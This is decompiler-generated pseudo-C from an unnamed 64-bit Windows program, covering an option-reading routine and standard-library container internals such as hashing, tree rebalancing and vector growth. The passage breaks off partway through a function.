//----- (0000000140021230) ----------------------------------------------------
__int64 __fastcall sub_140021230(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  char v4; // si
  _QWORD *v5; // rax
  char v6; // bl
  _QWORD *v7; // rax
  bool v8; // bl
  _QWORD *v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  _QWORD *v12; // rsi
  void **v13; // rbx
  _QWORD *v14; // rax
  __int64 v15; // rax
  __int64 v16; // rax
  _QWORD *v17; // rbx
  _QWORD *v18; // rax
  __int64 v19; // rax
  __int64 v20; // rax
  _QWORD *v21; // rsi
  void **v22; // rbx
  unsigned __int8 v23; // bl
  char v25; // [rsp+28h] [rbp-C0h]
  __int64 v26; // [rsp+40h] [rbp-A8h]
  void *Src; // [rsp+48h] [rbp-A0h]
  __int64 v28; // [rsp+58h] [rbp-90h]
  unsigned __int64 v29; // [rsp+60h] [rbp-88h]
  void *v30; // [rsp+68h] [rbp-80h]
  void *v31; // [rsp+78h] [rbp-70h]
  void *v32; // [rsp+A0h] [rbp-48h]
  void *v33; // [rsp+C8h] [rbp-20h]
  __int64 v34; // [rsp+D8h] [rbp-10h]
  unsigned __int64 v35; // [rsp+E0h] [rbp-8h]
  void *v36; // [rsp+110h] [rbp+28h]
  __int64 v37; // [rsp+120h] [rbp+38h]
  unsigned __int64 v38; // [rsp+128h] [rbp+40h]

  v26 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = 0;
  sub_14006BD10((__int64)&v25, 0);
  v5 = sub_14006F4A0(&v31);
  v6 = sub_140070EE0((__int64)v5, v2, (__int64)&v25, 1);
  if ( v38 >= 0x10 )
    operator delete(v36);
  v38 = 15i64;
  v37 = 0i64;
  LOBYTE(v36) = 0;
  if ( v35 >= 0x10 )
    operator delete(v33);
  v35 = 15i64;
  v34 = 0i64;
  LOBYTE(v33) = 0;
  sub_140007D70(&v32);
  operator delete(v32);
  v32 = 0i64;
  sub_140007CF0(&v31);
  operator delete(v31);
  if ( !v6 )
    goto LABEL_43;
  v8 = 0;
  if ( sub_14006E900((__int64)&v25) )
  {
    v7 = sub_140019940(&Src);
    v4 = 1;
    if ( sub_14006E8C0((__int64)&v25, v7) )
      v8 = 1;
  }
  if ( v4 & 1 && v29 >= 0x10 )
    operator delete(Src);
  if ( v8 )
  {
    v9 = sub_140019940(&v30);
    v10 = sub_14006C0C0((__int64)&v25, v9);
    v11 = sub_14006C4B0(v10, "b");
    v12 = sub_14006D2F0(v11, &Src);
    v13 = (void **)(v3 + 64);
    if ( (_QWORD *)(v3 + 64) != v12 )
    {
      if ( *(_QWORD *)(v3 + 88) >= 0x10ui64 )
        operator delete(*v13);
      *(_QWORD *)(v3 + 88) = 15i64;
      *(_QWORD *)(v3 + 80) = 0i64;
      *(_BYTE *)v13 = 0;
      sub_140004720((_QWORD *)(v3 + 64), v12);
    }
    if ( v29 >= 0x10 )
      operator delete(Src);
    v29 = 15i64;
    v28 = 0i64;
    LOBYTE(Src) = 0;
    if ( (unsigned __int64)v30 >= 0x10 )
      operator delete(v30);
    v14 = sub_140019940(&v30);
    v15 = sub_14006C0C0((__int64)&v25, v14);
    v16 = sub_14006C4B0(v15, "d");
    v17 = sub_14006D2F0(v16, &Src);
    if ( (_QWORD *)v3 != v17 )
    {
      if ( *(_QWORD *)(v3 + 24) >= 0x10ui64 )
        operator delete(*(void **)v3);
      *(_QWORD *)(v3 + 24) = 15i64;
      *(_QWORD *)(v3 + 16) = 0i64;
      *(_BYTE *)v3 = 0;
      sub_140004720((_QWORD *)v3, v17);
    }
    if ( v29 >= 0x10 )
      operator delete(Src);
    v29 = 15i64;
    v28 = 0i64;
    LOBYTE(Src) = 0;
    if ( (unsigned __int64)v30 >= 0x10 )
      operator delete(v30);
    v18 = sub_140019940(&v30);
    v19 = sub_14006C0C0((__int64)&v25, v18);
    v20 = sub_14006C4B0(v19, "o");
    v21 = sub_14006D2F0(v20, &Src);
    v22 = (void **)(v3 + 32);
    if ( (_QWORD *)(v3 + 32) != v21 )
    {
      if ( *(_QWORD *)(v3 + 56) >= 0x10ui64 )
        operator delete(*v22);
      *(_QWORD *)(v3 + 56) = 15i64;
      *(_QWORD *)(v3 + 48) = 0i64;
      *(_BYTE *)v22 = 0;
      sub_140004720((_QWORD *)(v3 + 32), v21);
    }
    if ( v29 >= 0x10 )
      operator delete(Src);
    v29 = 15i64;
    v28 = 0i64;
    LOBYTE(Src) = 0;
    if ( (unsigned __int64)v30 >= 0x10 )
      operator delete(v30);
    v23 = 1;
  }
  else
  {
LABEL_43:
    v23 = 0;
  }
  sub_14006BF10((__int64)&v25);
  return v23;
}

//----- (0000000140021580) ----------------------------------------------------
void sub_140021580()
{
  _QWORD *v0; // rax

  v0 = operator new(0x50ui64);
  if ( !v0 )
    std::_Xbad_alloc();
  *v0 = v0;
  if ( v0 != (_QWORD *)-8i64 )
    v0[1] = v0;
  if ( v0 != (_QWORD *)-16i64 )
    v0[2] = v0;
  *((_WORD *)v0 + 12) = 257;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (00000001400215D0) ----------------------------------------------------
void sub_1400215D0()
{
  _QWORD *v0; // rax

  v0 = operator new(0x40ui64);
  if ( !v0 )
    std::_Xbad_alloc();
  *v0 = v0;
  if ( v0 != (_QWORD *)-8i64 )
    v0[1] = v0;
  if ( v0 != (_QWORD *)-16i64 )
    v0[2] = v0;
  *((_WORD *)v0 + 12) = 257;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140021680) ----------------------------------------------------
_QWORD *__fastcall sub_140021680(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rdx

  v1 = a1;
  v2 = operator new(0x50ui64);
  if ( !v2 )
    std::_Xbad_alloc();
  *v2 = *v1;
  if ( v2 != (_QWORD *)-8i64 )
    v2[1] = *v1;
  if ( v2 != (_QWORD *)-16i64 )
    v2[2] = *v1;
  return v2;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (00000001400216E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400216E0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rdx

  v1 = a1;
  v2 = operator new(0x40ui64);
  if ( !v2 )
    std::_Xbad_alloc();
  *v2 = *v1;
  if ( v2 != (_QWORD *)-8i64 )
    v2[1] = *v1;
  if ( v2 != (_QWORD *)-16i64 )
    v2[2] = *v1;
  return v2;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140021740) ----------------------------------------------------
__int64 *__fastcall sub_140021740(__int64 **a1)
{
  __int64 *result; // rax
  unsigned __int64 v2; // rbx
  __int64 **v3; // rsi
  float v4; // xmm0_4
  float v5; // xmm1_4
  __int64 *v6; // rax
  __int64 *v7; // r8
  unsigned __int64 *v8; // rcx
  __int64 *v9; // rdi
  __int64 v10; // rdi
  __int64 v11; // rbx
  char v12; // [rsp+30h] [rbp-18h]
  __int64 *v13; // [rsp+50h] [rbp+8h]
  char v14; // [rsp+58h] [rbp+10h]

  result = a1[1];
  v2 = (unsigned __int64)a1[6];
  v3 = a1;
  v4 = (float)(signed int)result;
  if ( (signed __int64)result < 0 )
    v4 = v4 + 1.8446744e19;
  v5 = (float)(signed int)v2;
  if ( (v2 & 0x8000000000000000ui64) != 0i64 )
    v5 = v5 + 1.8446744e19;
  if ( (float)(v4 / v5) > *((float *)a1 + 14) )
  {
    if ( v2 >= 0x200 )
    {
      if ( v2 < 0xFFFFFFFFFFFFFFFi64 )
        v2 *= 2i64;
    }
    else
    {
      v2 *= 8i64;
    }
    v6 = *a1;
    v7 = a1[2];
    v8 = (unsigned __int64 *)(a1 + 2);
    v13 = v6;
    v8[1] = (unsigned __int64)v7;
    sub_140021980(v8, &v14, (unsigned __int64)v7, 2 * v2, (__int64 *)&v13);
    v9 = *v3;
    result = (__int64 *)(v2 - 1);
    v3[5] = (__int64 *)(v2 - 1);
    v3[6] = (__int64 *)v2;
    if ( (__int64 *)*v9 != v9 )
    {
      v10 = v9[1];
      do
      {
        v11 = **v3;
        result = (__int64 *)sub_14001EBA0((__int64)v3, (__int64)&v12, (unsigned __int64 *)(v11 + 16), (__int64 **)v11);
      }
      while ( v11 != v10 );
    }
  }
  return result;
}

//----- (0000000140021830) ----------------------------------------------------
void __fastcall sub_140021830(__int64 a1, _QWORD **a2)
{
  void *v2; // rbx

  v2 = a2;
  *a2[1] = *a2;
  (*a2)[1] = a2[1];
  --*(_QWORD *)(a1 + 8);
  sub_14001FDE0((__int64)(a2 + 2));
  operator delete(v2);
}

//----- (0000000140021870) ----------------------------------------------------
void __fastcall sub_140021870(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  char v3; // [rsp+38h] [rbp+10h]

  v2 = a2;
  sub_14000CA70((__int64 **)(a2 + 64), (__int64 *)&v3, **(_QWORD **)(a2 + 64), *(_QWORD *)(a2 + 64));
  operator delete(*(void **)(v2 + 64));
  if ( *(_QWORD *)(v2 + 56) >= 0x10ui64 )
    operator delete(*(void **)(v2 + 32));
  *(_QWORD *)(v2 + 56) = 15i64;
  *(_QWORD *)(v2 + 48) = 0i64;
  *(_BYTE *)(v2 + 32) = 0;
  operator delete((void *)v2);
}

//----- (00000001400218E0) ----------------------------------------------------
void __fastcall sub_1400218E0(__int64 a1, __int64 **a2)
{
  __int64 **v2; // rbx
  __int64 v3; // rbp
  __int64 **i; // rsi
  char v5; // [rsp+38h] [rbp+10h]

  v2 = a2;
  v3 = a1;
  for ( i = a2; !*((_BYTE *)i + 25); v2 = i )
  {
    sub_1400218E0(v3, i[2]);
    i = (__int64 **)*i;
    sub_14000CA70(v2 + 8, (__int64 *)&v5, *v2[8], (__int64)v2[8]);
    operator delete(v2[8]);
    if ( (unsigned __int64)v2[7] >= 0x10 )
      operator delete(v2[4]);
    v2[7] = (__int64 *)15;
    v2[6] = 0i64;
    *((_BYTE *)v2 + 32) = 0;
    operator delete(v2);
  }
}

//----- (0000000140021980) ----------------------------------------------------
_QWORD *__fastcall sub_140021980(unsigned __int64 *a1, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4, __int64 *a5)
{
  __int64 v5; // rdi
  unsigned __int64 v6; // r12
  unsigned __int64 *v7; // r15
  unsigned __int64 v8; // rcx
  signed __int64 v9; // r13
  unsigned __int64 v10; // rbx
  char *v11; // r14
  signed __int64 v12; // r14
  unsigned __int64 v13; // r8
  unsigned __int64 v14; // rbx
  unsigned __int64 v15; // rbx
  _QWORD *v16; // r14
  signed __int64 v17; // r12
  __int64 v18; // rdi
  __int64 v19; // rsi
  unsigned __int64 v20; // rdx
  __int64 v21; // rbx
  signed __int64 v22; // ST68_8
  unsigned __int64 v23; // rax
  _QWORD *v24; // rcx
  unsigned __int64 v25; // rdx
  signed __int64 v26; // r12
  char *v27; // rdi
  _QWORD *v28; // rdx
  signed __int64 v29; // r14
  _QWORD *result; // rax
  _QWORD *v31; // [rsp+88h] [rbp+10h]
  unsigned __int64 v32; // [rsp+90h] [rbp+18h]
  _QWORD *v33; // [rsp+98h] [rbp+20h]

  v32 = a3;
  v31 = a2;
  v5 = a4;
  v6 = a3;
  v7 = a1;
  v8 = *a1;
  v9 = (signed __int64)(a3 - v8) >> 3;
  if ( a4 )
  {
    v10 = v7[2];
    v11 = (char *)v7[1];
    if ( (signed __int64)(v7[2] - (_QWORD)v11) >> 3 >= a4 )
    {
      v19 = 0i64;
      v20 = v7[1];
      v21 = *a5;
      if ( (signed __int64)&v11[-a3] >> 3 >= a4 )
      {
        v26 = a4;
        v27 = &v11[-8 * a4];
        v7[1] = (unsigned __int64)sub_14001FB00((unsigned __int64)&v11[-8 * a4], v20, v11);
        v28 = (_QWORD *)v32;
        if ( (char *)v32 != v27 )
        {
          v29 = v11 - v27;
          do
          {
            v27 -= 8;
            *(_QWORD *)&v27[v29] = *(_QWORD *)v27;
            v28 = (_QWORD *)v32;
          }
          while ( (char *)v32 != v27 );
        }
        if ( v28 != &v28[v26] )
        {
          do
          {
            *v28 = v21;
            ++v28;
          }
          while ( v28 != (_QWORD *)(v26 * 8 + v32) );
        }
      }
      else
      {
        v33 = (_QWORD *)*a5;
        v22 = 8 * a4;
        sub_14001FB00(a3, v20, (_QWORD *)(8 * a4 + a3));
        sub_14001FAD0((__int64 *)v7[1], v5 - ((signed __int64)(v7[1] - v32) >> 3), (__int64 *)&v33);
        v7[1] += v22;
        v23 = v7[1] - v22;
        v24 = (_QWORD *)v32;
        v25 = (v23 - v32 + 7) >> 3;
        if ( v32 > v23 )
          v25 = 0i64;
        if ( v25 )
        {
          do
          {
            *v24 = v21;
            ++v24;
            ++v19;
          }
          while ( v19 != v25 );
        }
      }
    }
    else
    {
      v12 = (signed __int64)&v11[-v8] >> 3;
      v13 = 0x1FFFFFFFFFFFFFFFi64;
      if ( 0x1FFFFFFFFFFFFFFFi64 - v12 < a4 )
      {
        std::_Xlength_error("vector<T> too long");
        __debugbreak();
      }
      v14 = (signed __int64)(v10 - v8) >> 3;
      if ( v13 - (v14 >> 1) >= v14 )
        v15 = (v14 >> 1) + v14;
      else
        v15 = 0i64;
      if ( v15 < v12 + a4 )
        v15 = v12 + a4;
      v16 = 0i64;
      v33 = 0i64;
      if ( v15 )
      {
        if ( v15 <= v13 && (v16 = operator new(8 * v15), (v33 = v16) != 0i64) )
        {
          v6 = v32;
        }
        else
        {
          std::_Xbad_alloc();
          __debugbreak();
        }
      }
      v17 = (signed __int64)(v6 - *v7) >> 3;
      sub_14001FAD0(&v16[v17], v5, a5);
      sub_14001FB00(*v7, v32, v16);
      sub_14001FB00(v32, v7[1], &v16[v17 + v5]);
      v18 = ((signed __int64)(v7[1] - *v7) >> 3) + v5;
      if ( *v7 )
        operator delete((void *)*v7);
      v7[2] = (unsigned __int64)&v16[v15];
      v7[1] = (unsigned __int64)&v16[v18];
      *v7 = (unsigned __int64)v16;
    }
  }
  result = v31;
  *v31 = *v7 + 8 * v9;
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140021CD0) ----------------------------------------------------
__int64 *__fastcall sub_140021CD0(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rbp
  const void **v3; // r14
  __int64 *v4; // rbx
  size_t v5; // rsi
  unsigned __int64 v6; // r15
  _QWORD *v7; // rcx
  const void *v8; // rdx
  size_t v9; // rdi
  size_t v10; // r8
  int v11; // eax

  v2 = (__int64 *)*a1;
  v3 = (const void **)a2;
  v4 = *(__int64 **)(*a1 + 8);
  if ( !*((_BYTE *)v4 + 25) )
  {
    v5 = *(_QWORD *)(a2 + 16);
    v6 = *(_QWORD *)(a2 + 24);
    do
    {
      v7 = v4 + 4;
      if ( v6 < 0x10 )
        v8 = v3;
      else
        v8 = *v3;
      v9 = v4[6];
      if ( (unsigned __int64)v4[7] >= 0x10 )
        v7 = (_QWORD *)*v7;
      v10 = v5;
      if ( v9 < v5 )
        v10 = v4[6];
      if ( v10 )
        v11 = memcmp(v7, v8, v10);
      else
        v11 = 0;
      if ( !v11 )
      {
        if ( v9 < v5 )
          goto LABEL_18;
        LOBYTE(v11) = v9 != v5;
      }
      if ( v11 < 0 )
      {
LABEL_18:
        v4 = (__int64 *)v4[2];
        continue;
      }
      v2 = v4;
      v4 = (__int64 *)*v4;
    }
    while ( !*((_BYTE *)v4 + 25) );
  }
  return v2;
}

//----- (0000000140021D80) ----------------------------------------------------
_QWORD *__fastcall sub_140021D80(__int64 *a1, _QWORD *a2, size_t *a3)
{
  unsigned __int64 v3; // r11
  size_t v4; // rsi
  size_t *v5; // r14
  _QWORD *v6; // r13
  __int64 *v7; // r10
  _QWORD *v8; // r9
  size_t v9; // rdx
  unsigned __int64 v10; // rcx
  __int64 v11; // rax
  unsigned __int64 v12; // r8
  unsigned __int64 v13; // rdx
  __int64 v14; // rcx
  __int64 v15; // r15
  __int64 v16; // r12
  _QWORD **v17; // r9
  _QWORD *v18; // rbx
  _QWORD *v19; // rax
  _QWORD *v20; // rcx
  const void *v21; // rdx
  size_t v22; // rdi
  size_t v23; // r8
  int v24; // eax
  _QWORD *v25; // rdi
  _QWORD *v26; // rax
  size_t v27; // rbp
  _QWORD *v28; // rdx
  size_t v29; // rsi
  const void *v30; // rcx
  size_t v31; // r8
  int v32; // eax
  signed __int64 v34; // [rsp+50h] [rbp+8h]

  v3 = a3[3];
  v4 = a3[2];
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( v3 < 0x10 )
    v8 = a3;
  else
    v8 = (_QWORD *)*a3;
  v9 = 0i64;
  v10 = -3750763034362895579i64;
  if ( v4 )
  {
    do
    {
      v11 = *((unsigned __int8 *)v8 + v9++);
      v10 = 1099511628211i64 * (v11 ^ v10);
    }
    while ( v9 < v4 );
  }
  v12 = v7[5];
  v13 = v12 & (v10 ^ (v10 >> 32));
  if ( v7[6] <= v13 )
    v13 += -1i64 - (v12 >> 1);
  v14 = v7[2];
  v15 = *v7;
  v16 = *(_QWORD *)(v14 + 16 * v13);
  v17 = (_QWORD **)(v14 + 8 + 16 * v13);
  v18 = *(_QWORD **)(v14 + 16 * v13);
  v34 = v14 + 8 + 16 * v13;
  while ( 1 )
  {
    v19 = (_QWORD *)(v16 == v15 ? v15 : **v17);
    if ( v18 == v19 )
      break;
    v20 = v18 + 2;
    if ( v3 < 0x10 )
      v21 = v5;
    else
      v21 = (const void *)*v5;
    v22 = v18[4];
    if ( v18[5] >= 0x10ui64 )
      v20 = (_QWORD *)*v20;
    v23 = v4;
    if ( v22 < v4 )
      v23 = v18[4];
    if ( v23 )
    {
      v24 = memcmp(v20, v21, v23);
      v17 = (_QWORD **)v34;
      v3 = v5[3];
    }
    else
    {
      v24 = 0;
    }
    if ( !v24 )
    {
      if ( v22 < v4 )
        goto LABEL_27;
      LOBYTE(v24) = v22 != v4;
    }
    if ( !v24 )
    {
      v25 = v18;
      while ( 1 )
      {
        v26 = (_QWORD *)(v16 == v15 ? v15 : **v17);
        if ( v18 == v26 )
          break;
        v27 = v18[4];
        v28 = v18 + 2;
        if ( v18[5] >= 0x10ui64 )
          v28 = (_QWORD *)*v28;
        v29 = v5[2];
        if ( v3 < 0x10 )
          v30 = v5;
        else
          v30 = (const void *)*v5;
        v31 = v18[4];
        if ( v29 < v27 )
          v31 = v5[2];
        if ( v31 )
        {
          v32 = memcmp(v30, v28, v31);
          v3 = v5[3];
        }
        else
        {
          v32 = 0;
        }
        if ( !v32 )
        {
          if ( v29 < v27 )
            break;
          LOBYTE(v32) = v29 != v27;
        }
        if ( v32 )
          break;
        v18 = (_QWORD *)*v18;
        v17 = (_QWORD **)v34;
      }
      if ( v25 != v18 )
      {
        *v6 = v25;
        v6[1] = v18;
        return v6;
      }
      break;
    }
LABEL_27:
    v18 = (_QWORD *)*v18;
  }
  *v6 = v15;
  v6[1] = v15;
  return v6;
}

//----- (0000000140021F60) ----------------------------------------------------
__int64 *__fastcall sub_140021F60(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 *v4; // rdi
  __int64 *v5; // rdx
  __int64 **v6; // rbx
  __int64 *v7; // rax
  __int64 v8; // rcx
  __int64 *result; // rax
  __int64 v10; // rax
  __int64 v11; // rdx
  __int64 j; // rcx
  __int64 i; // rcx
  char v14; // [rsp+30h] [rbp+8h]
  __int64 v15; // [rsp+40h] [rbp+18h]
  __int64 v16; // [rsp+48h] [rbp+20h]

  v16 = a4;
  v15 = a3;
  v4 = a2;
  v5 = *a1;
  v6 = a1;
  if ( a3 != **a1 || (__int64 *)a4 != v5 )
  {
    if ( a3 != a4 )
    {
      do
      {
        v10 = a3;
        if ( !*(_BYTE *)(a3 + 25) )
        {
          v11 = *(_QWORD *)(a3 + 16);
          if ( *(_BYTE *)(v11 + 25) )
          {
            for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
            {
              if ( a3 != *(_QWORD *)(i + 16) )
                break;
              v15 = i;
              a3 = i;
            }
            v15 = i;
          }
          else
          {
            for ( j = *(_QWORD *)v11; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
              v11 = j;
            v15 = v11;
          }
        }
        sub_140022060(v6, &v14, v10);
        a3 = v15;
      }
      while ( v15 != v16 );
    }
    *v4 = a3;
    result = v4;
  }
  else
  {
    sub_1400218E0((__int64)a1, (__int64 **)v5[1]);
    (*v6)[1] = (__int64)*v6;
    **v6 = (__int64)*v6;
    (*v6)[2] = (__int64)*v6;
    v7 = *v6;
    v6[1] = 0i64;
    v8 = *v7;
    result = v4;
    *v4 = v8;
  }
  return result;
}

//----- (0000000140022060) ----------------------------------------------------
_QWORD *__fastcall sub_140022060(_QWORD *a1, _QWORD *a2, __int64 a3)
{
  _QWORD *v3; // rsi
  _QWORD *v4; // r15
  _QWORD *v5; // r14
  __int64 v6; // rax
  __int64 j; // rax
  __int64 i; // rax
  __int64 v9; // rdi
  __int64 v10; // rbx
  __int64 k; // rcx
  __int64 v12; // rax
  _QWORD *v13; // rdx
  __int64 v14; // rax
  __int64 l; // rcx
  __int64 *v16; // rax
  char v17; // cl
  _BYTE *v18; // rcx
  __int64 *v19; // rcx
  __int64 **v20; // rax
  _BYTE *v21; // rcx
  __int64 v22; // rax
  _QWORD *v23; // rax
  __int64 v24; // rax
  char v26; // [rsp+40h] [rbp+8h]
  __int64 v27; // [rsp+50h] [rbp+18h]

  v27 = a3;
  v3 = (_QWORD *)a3;
  v4 = a2;
  v5 = a1;
  if ( !*(_BYTE *)(a3 + 25) )
  {
    v6 = *(_QWORD *)(a3 + 16);
    if ( *(_BYTE *)(v6 + 25) )
    {
      for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( a3 != *(_QWORD *)(i + 16) )
          break;
        v27 = i;
        a3 = i;
      }
      a3 = i;
      v27 = i;
    }
    else
    {
      a3 = *(_QWORD *)(a3 + 16);
      for ( j = *(_QWORD *)v6; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
        a3 = j;
      v27 = a3;
    }
  }
  if ( *(_BYTE *)(*v3 + 25i64) )
  {
    v9 = v3[2];
LABEL_15:
    v10 = v3[1];
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    if ( *(_QWORD **)(*a1 + 8i64) == v3 )
    {
      *(_QWORD *)(*a1 + 8i64) = v9;
    }
    else if ( *(_QWORD **)v10 == v3 )
    {
      *(_QWORD *)v10 = v9;
    }
    else
    {
      *(_QWORD *)(v10 + 16) = v9;
    }
    if ( *(_QWORD **)*a1 == v3 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        k = v10;
      }
      else
      {
        v12 = *(_QWORD *)v9;
        for ( k = v9; !*(_BYTE *)(v12 + 25); v12 = *(_QWORD *)v12 )
          k = v12;
      }
      *(_QWORD *)*v5 = k;
    }
    v13 = (_QWORD *)*v5;
    if ( *(_QWORD **)(*v5 + 16i64) == v3 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        v13[2] = v10;
      }
      else
      {
        v14 = *(_QWORD *)(v9 + 16);
        for ( l = v9; !*(_BYTE *)(v14 + 25); v14 = *(_QWORD *)(v14 + 16) )
          l = v14;
        v13[2] = l;
      }
    }
    goto LABEL_45;
  }
  if ( *(_BYTE *)(v3[2] + 25i64) )
  {
    v9 = *v3;
    goto LABEL_15;
  }
  v9 = *(_QWORD *)(a3 + 16);
  if ( (_QWORD *)a3 == v3 )
    goto LABEL_15;
  *(_QWORD *)(*v3 + 8i64) = a3;
  *(_QWORD *)a3 = *v3;
  if ( a3 == v3[2] )
  {
    v10 = a3;
  }
  else
  {
    v10 = *(_QWORD *)(a3 + 8);
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    *(_QWORD *)v10 = v9;
    *(_QWORD *)(a3 + 16) = v3[2];
    *(_QWORD *)(v3[2] + 8i64) = a3;
  }
  if ( *(_QWORD **)(*a1 + 8i64) == v3 )
  {
    *(_QWORD *)(*a1 + 8i64) = a3;
  }
  else
  {
    v16 = (__int64 *)v3[1];
    if ( (_QWORD *)*v16 == v3 )
      *v16 = a3;
    else
      v16[2] = a3;
  }
  *(_QWORD *)(a3 + 8) = v3[1];
  v17 = *(_BYTE *)(a3 + 24);
  *(_BYTE *)(a3 + 24) = *((_BYTE *)v3 + 24);
  *((_BYTE *)v3 + 24) = v17;
LABEL_45:
  if ( *((_BYTE *)v3 + 24) == 1 )
  {
    for ( ; v9 != *(_QWORD *)(*v5 + 8i64); v10 = *(_QWORD *)(v10 + 8) )
    {
      if ( *(_BYTE *)(v9 + 24) != 1 )
        break;
      v18 = *(_BYTE **)v10;
      if ( v9 == *(_QWORD *)v10 )
      {
        v18 = *(_BYTE **)(v10 + 16);
        if ( !v18[24] )
        {
          v18[24] = 1;
          v19 = *(__int64 **)(v10 + 16);
          *(_BYTE *)(v10 + 24) = 0;
          *(_QWORD *)(v10 + 16) = *v19;
          if ( !*(_BYTE *)(*v19 + 25) )
            *(_QWORD *)(*v19 + 8) = v10;
          v19[1] = *(_QWORD *)(v10 + 8);
          if ( v10 == *(_QWORD *)(*v5 + 8i64) )
          {
            *(_QWORD *)(*v5 + 8i64) = v19;
          }
          else
          {
            v20 = *(__int64 ***)(v10 + 8);
            if ( (__int64 *)v10 == *v20 )
              *v20 = v19;
            else
              v20[2] = v19;
          }
          *v19 = v10;
          *(_QWORD *)(v10 + 8) = v19;
          v18 = *(_BYTE **)(v10 + 16);
        }
        if ( v18[25] )
          goto LABEL_77;
        if ( *(_BYTE *)(*(_QWORD *)v18 + 24i64) != 1 || *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) != 1 )
        {
          if ( *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) == 1 )
          {
            *(_BYTE *)(*(_QWORD *)v18 + 24i64) = 1;
            v18[24] = 0;
            sub_14000C800((__int64)v5, v18);
            v18 = *(_BYTE **)(v10 + 16);
          }
          v18[24] = *(_BYTE *)(v10 + 24);
          *(_BYTE *)(v10 + 24) = 1;
          *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) = 1;
          sub_14001BF70((__int64)v5, v10);
          break;
        }
      }
      else
      {
        if ( !v18[24] )
        {
          v18[24] = 1;
          v21 = *(_BYTE **)v10;
          *(_BYTE *)(v10 + 24) = 0;
          *(_QWORD *)v10 = *((_QWORD *)v21 + 2);
          v22 = *((_QWORD *)v21 + 2);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v10;
          *((_QWORD *)v21 + 1) = *(_QWORD *)(v10 + 8);
          if ( v10 == *(_QWORD *)(*v5 + 8i64) )
          {
            *(_QWORD *)(*v5 + 8i64) = v21;
          }
          else
          {
            v23 = *(_QWORD **)(v10 + 8);
            if ( v10 == v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *((_QWORD *)v21 + 2) = v10;
          *(_QWORD *)(v10 + 8) = v21;
          v18 = *(_BYTE **)v10;
        }
        if ( v18[25] )
          goto LABEL_77;
        if ( *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) != 1 || *(_BYTE *)(*(_QWORD *)v18 + 24i64) != 1 )
        {
          if ( *(_BYTE *)(*(_QWORD *)v18 + 24i64) == 1 )
          {
            *(_BYTE *)(*((_QWORD *)v18 + 2) + 24i64) = 1;
            v18[24] = 0;
            sub_14001BF70((__int64)v5, (__int64)v18);
            v18 = *(_BYTE **)v10;
          }
          v18[24] = *(_BYTE *)(v10 + 24);
          *(_BYTE *)(v10 + 24) = 1;
          *(_BYTE *)(*(_QWORD *)v18 + 24i64) = 1;
          sub_14000C800((__int64)v5, (_QWORD *)v10);
          break;
        }
      }
      v18[24] = 0;
LABEL_77:
      v9 = v10;
    }
    *(_BYTE *)(v9 + 24) = 1;
  }
  sub_14000CA70((__int64 **)v3 + 8, (__int64 *)&v26, *(_QWORD *)v3[8], v3[8]);
  operator delete((void *)v3[8]);
  if ( v3[7] >= 0x10ui64 )
    operator delete((void *)v3[4]);
  v3[7] = 15i64;
  v3[6] = 0i64;
  *((_BYTE *)v3 + 32) = 0;
  operator delete(v3);
  v24 = v5[1];
  if ( v24 )
    v5[1] = v24 - 1;
  *v4 = v27;
  return v4;
}

//----- (0000000140022470) ----------------------------------------------------
_QWORD *__fastcall sub_140022470(_QWORD *a1, _QWORD *a2, const void **a3)
{
  unsigned __int64 v3; // r12
  size_t v4; // rsi
  const void **v5; // r14
  _QWORD *v6; // r9
  int v7; // er15
  unsigned __int64 v8; // rcx
  size_t v9; // rdx
  __int64 v10; // rax
  unsigned __int64 v11; // r8
  unsigned __int64 v12; // rdx
  __int64 v13; // rcx
  _QWORD *v14; // rbp
  _QWORD *v15; // r13
  _QWORD **v16; // rax
  _QWORD *v17; // rbx
  _QWORD *v18; // rax
  _QWORD *v19; // rcx
  const void *v20; // rdx
  size_t v21; // rdi
  size_t v22; // r8
  int v23; // eax
  size_t v24; // rdi
  _QWORD *v25; // rdx
  size_t v26; // r8
  int v27; // eax
  _QWORD *result; // rax
  signed __int64 i; // [rsp+60h] [rbp+8h]
  _QWORD *v30; // [rsp+60h] [rbp+8h]
  _QWORD *v31; // [rsp+68h] [rbp+10h]

  v31 = a2;
  v3 = (unsigned __int64)a3[3];
  v4 = (size_t)a3[2];
  v5 = a3;
  v6 = a1;
  if ( v3 >= 0x10 )
    a3 = (const void **)*a3;
  v7 = 0;
  v8 = -3750763034362895579i64;
  v9 = 0i64;
  if ( v4 )
  {
    do
    {
      v10 = *((unsigned __int8 *)a3 + v9++);
